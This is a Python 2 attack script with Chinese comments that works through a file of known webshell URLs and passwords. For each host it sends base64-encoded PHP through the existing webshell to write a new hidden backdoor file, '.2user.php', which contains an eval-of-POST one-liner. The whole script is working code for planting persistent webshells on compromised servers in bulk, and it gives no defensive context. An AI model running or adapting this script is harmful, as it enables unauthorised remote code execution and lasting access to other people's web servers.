#!/usr/bin/python
#coding=utf-8
# 需要修改的地方：
# shellcmd
# 即webshell的内容和路径

import sys,requests,base64

def loadfile(filepath):
	try : 
		file = open(filepath,"rb")
		return str(file.read())
	except : 
		print "File %s Not Found!" %filepath
		sys.exit()

def postshell(url,method,passwd):
	#print url
	#判断shell是否存在
	try :
		res = requests.get(url,timeout=3)
	except : 
		print "[-] %s ERR_CONNECTION_TIMED_OUT" %url
		return 0
	if res.status_code!=200 :
		print "[-] %s Page Not Found!" %url
		return 0
	#执行命令 system,exec,passthru,`,shell_exec
	shellcmd = "echo \'<?php @eval(\$_POST[Test@1234]);?>\' > .2user.php"
	getshell_cmd ="system(\"%s\");"%shellcmd
	data={}
	if method=='get':
		data[passwd]='@eval(base64_decode($_GET[z0]));'
		data['z0']=base64.b64encode(getshell_cmd)
		res = requests.get(url,params=data,timeout=3)
		verify = requests.get(url,)
		#print res.url
		if res.status_code==200:
			#content = url+"\n"+res.content+"\n\n"
			#print content
			print "[+] %s getshell sucessed!"%url
	elif method=='post':
		#data['pass']='Sn3rtf4ck'
		data[passwd]='@eval(base64_decode($_POST[z0]));'
		data['z0']=base64.b64encode(getshell_cmd)
		res = requests.post(url,data=data,timeout=3)
		if res.status_code==200:
			#content = url+"\n"+res.content+"\n\n"
			#print content
			print "[+] %s getshell sucessed!"%url
	


if __name__ == '__main__':
	#存放webshell的文件
	shellstr=loadfile("./webshell.txt")
	list = shellstr.split("\r\n")
	#print str(list)
	i = 0
	url={}
	passwd={}
	method={}
	for data in list:
		if data:
			ls = data.split(",")
			method_tmp = str(ls[1])
			method_tmp = method_tmp.lower()
			if method_tmp=='post' or method_tmp=='get':
				url[i]=str(ls[0])
				method[i]=method_tmp
				passwd[i]=str(ls[2])
				i+=1
			else :
				print "[-] %s request method error!" %(str(ls[0]))
				file_write(flag_path,"[-] %s request method error!\n\n" %(str(ls[0])))
		else : pass
	#print str(len(url))
	for j in range(len(url)):
		#调用执行命令的模块
		#print str(j)
		#print "url is %s method is %s passwd is %s" %(url[j],method[j],passwd[j])
		postshell(url=url[j],method=method[j],passwd=passwd[j])
	print "Getshell all finished!"
